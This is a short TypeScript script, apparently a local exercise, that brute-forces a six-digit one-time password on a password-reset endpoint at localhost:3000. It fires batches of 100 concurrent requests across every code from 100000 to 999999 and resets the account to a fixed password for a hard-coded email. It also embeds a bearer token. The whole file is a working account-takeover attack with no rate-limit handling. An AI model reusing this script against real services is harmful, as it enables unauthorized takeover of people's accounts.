import axios from "axios";

async function sendRequest(otp: number) {
	let data = JSON.stringify({
		email: "ayig2302@gmail.com",
		otp: otp.toString(),
		newPassword: "123456789",
	});

	let config = {
		method: "post",
		maxBodyLength: Infinity,
		url: "http://localhost:3000/reset-password",
		headers: {
			Authorization:
				"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NH0.zOSYXIYyI9zc0E1E2QntAoKBw6HohISXYi6L6ok3wLA",
			"Content-Type": "application/json",
		},
		data: data,
	};

	try {
		const response = await axios.request(config);
		if (response.status === 200) return true;
	} catch (e) {}
}

async function main() {
	for (let i = 100000; i < 1000000; i += 100) {
		const promises = [];
		console.log("Checking range: " + i + " to " + (i + 99));
		for (let j = 0; j < 100; j++) {
			promises.push(sendRequest(i + j));
		}
		const results = await Promise.all(promises);
		if (results.includes(true)) {
			break;
		}
	}
}

main();
